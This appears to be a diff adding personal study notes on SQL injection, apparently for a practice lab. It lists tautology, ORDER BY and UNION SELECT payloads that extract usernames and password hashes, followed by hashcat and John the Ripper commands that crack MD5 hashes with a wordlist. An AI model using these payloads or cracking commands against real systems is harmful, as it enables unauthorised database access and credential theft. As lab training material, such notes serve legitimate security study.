@@ -1,0 +1,30 @@
+SQL INJECTION
+
+$getid = "SELECT first_name, last_name FROM users WHERE user_id = '$id'"
+
+$getid = "SELECT first_name, last_name FROM users WHERE user_id = '1' or '1'='1;";
+
+try first
+1' or '1' = '1 (statement true)
+
+to check how many columns
+' ORDER BY 1#
+
+' UNION SELECT user, password FROM users#
+
+Then hashid on Kali Linux
+
+hashcat -h
+Save hashes in a txt file
+using hashcat to crack a password
+
+hashcat -a 0 -m 0 hashes ~/SecLists/Passwords/probable-v2-top1575.txt
+
+Using john to crack a password hash
+
+john --list=formats | grep MD5
+john --format=Raw-MD5 --wordlist=~/SecLists/Passwords/probable-v2-top1575.txt hashes
+
+Online tools to crack a password hash
+
+https://crackstation.net/
